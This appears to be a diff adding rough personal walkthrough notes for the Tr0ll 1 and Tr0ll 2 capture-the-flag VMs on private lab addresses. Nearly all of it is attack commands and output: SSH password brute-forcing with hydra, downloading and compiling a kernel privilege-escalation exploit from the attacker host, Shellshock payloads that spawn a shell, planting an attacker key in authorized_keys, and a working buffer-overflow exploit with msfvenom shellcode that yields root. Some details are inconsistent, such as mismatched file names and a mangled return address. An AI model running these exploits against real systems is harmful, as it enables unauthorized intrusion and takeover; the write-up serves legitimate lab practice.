@@ -1,0 +1,127 @@
+ Level One:
+ftp 192.168.139.135
+ by anonymous
+
+tcpdump -nnttttAr lol.pcap | less
+
+found:
+sup3rs3cr3tdirlol
+
+than:
+
+http://192.168.139.135/sup3rs3cr3tdirlol/
+
+strings roflmao
+
+Find address 0x0856BF to proceed
+
+
+http://192.168.139.135/0x0856BF/
+Userlist:
+maleus-----overflow
+
+false workout:
+hydra -L users.txt -p Pass.txt 192.168.139.135 ssh
+
+Positive:
+searchsploit Linux 3.13 Privilege Escalation
+cp /usr/share/exploitdb/exploits/linux/local/37292.c ~/Documents/Tr0ll
+
+ssh overflow@192.168.139.135
+Password:Pass.txt
+
+$ wget http://192.168.139.129/37292.c
+$ gcc 37292.c
+$ ./a.out
+
+Level Two:
+
+dirb http://192.168.139.136 
+found:
+/robots.txt ---> dirs.txt
+
+dirb http://192.168.139.136 dirs.txt
+"
+wget http://192.168.139.136/noob/cat_the_troll.jpg -O noob.jpg                                  
+wget http://192.168.139.136/keep_trying/cat_the_troll.jpg -O keep_trying.jpg                             
+wget http://192.168.139.136/dont_bother/cat_the_troll.jpg -O dont_bother.jpg                             
+wget http://192.168.139.136/ok_this_is_it/cat_the_troll.jpg -O ok_this_is_it.jpg  
+"
+THEN:
+md5sum *.jpg
+
+strings dont_bother.jpg
+
+cat answer.txt | base64 --decode > pass.txt
+
+On FTP 
+user&password:Tr0ll
+get lmap.zip
+
+fcrackzip -v -D -u -p pass.txt lmao.zip 
+
+false workout:
+ssh -i noob noob@192.168.23.135
+TRY HARDER LOL!
+
+To check why not work~~~
+ssh -i noob noob@192.168.139.136 -v
+*See:
+debug1: Remote: Forced command.
+*Ref:
+/usr/share/exploitdb/exploits/linux/remote/34765.txt
+PoC:
+ssh -i noob noob@192.168.139.136 '() { :;}; echo vulnerable'
+ssh -i noob noob@192.168.139.136 '() { :;}; /bin/bash'
+
+SSH get shell:
+cp noob ~/.ssh/id_rsa
+ssh-keygen -t rsa
+Put Key:
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrSbCoknTTVJx15b/9Db/SvlfeT7UyLgZMtAhCIGzrbAv4aL0BAiRFPa4WZxU5/r0eSfmi/Yv2AoVSMAU2VByq87zvcan1VgLIMrX4m7ltDfnUWK4UsumTeJ8f25A6YsQ6baEJboQdVe9SdZZYsvvrRmeH6rFNjwuSU46fqlHDQMfM5Ik8e4csr0oYmMFuibrK5cvSuq/qOgnJu3JtXkJJUeGX/ehLMcaw4J0lmiZrvoNgPmppJA1WbQhlxKHHzU37dVFHTeN3uYJ2EtYvI0v1P/G45hMZEdu+k3oy5CIWX/i3u4Ota5bsqQjhDpMfe1J1i3ObDIth+cwQY6WNad/D root@kali" > .ssh/authorized_keys 
+
+ssh -i ~/.ssh/id_rsa noob@192.168.139.136
+
+Search permissions command(Please remember):
+/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+
+PoC of bufferoverflow:
+./r00t $(python -c 'print "A" * 1000')
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 1000')
+Segmentation fault
+
+Make pattern:
+locate  pattern_create
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+gdb r00t
+(gdb) r A.....
+
+0x6a413969
+
+Calc. the overflow offset:
+/usr/bin/msf-pattern_offset
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969
+[*] Exact match at offset 268
+
+(gdb) r $(python -c 'print "A" * 268 + "B" * 4')
+????
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ env - gdb r00t
+
+(gdb) show env
+LINES=30
+COLUMNS=91
+(gdb) unset env LINES
+(gdb) unset env COLUMNS
+(gdb) run $(python -c 'print "A" * 268 + "BBBB" + "\x90" * 16 + "C" * 100')
+msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86 -e x86/shikata_ga_nai
+env - ./r00t $(python -c 'print "A" * 268 + "x80\xfc\xff\xbf" + "\x90" * 10 + "\xdb\xc6\xd9\x74\x24\xf4\xbf\xdb\x3d\x8c\x51\x58\x31\xc9\xb1\x0b\x31\x78\x1a\x83\xe8\xfc\x03\x78\x16\xe2\x2e\x57\x87\x09\x49\xfa\xf1\xc1\x44\x98\x74\xf6\xfe\x71\xf4\x91\xfe\xe5\xd5\x03\x97\x9b\xa0\x27\x35\x8c\xbb\xa7\xb9\x4c\x93\xc5\xd0\x22\xc4\x7a\x4a\xbb\x4d\x2e\x03\x5a\xbc\x50"')
+????
+
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t  $(python -c 'print "A" * 268 + "\x67\xfe\xff\xbf"')
+
+# whoami
+root
+# cat Proof.txt	
+You win this time young Jedi...
+
+a70354f0258dcc00292c72aab3c8b1e4
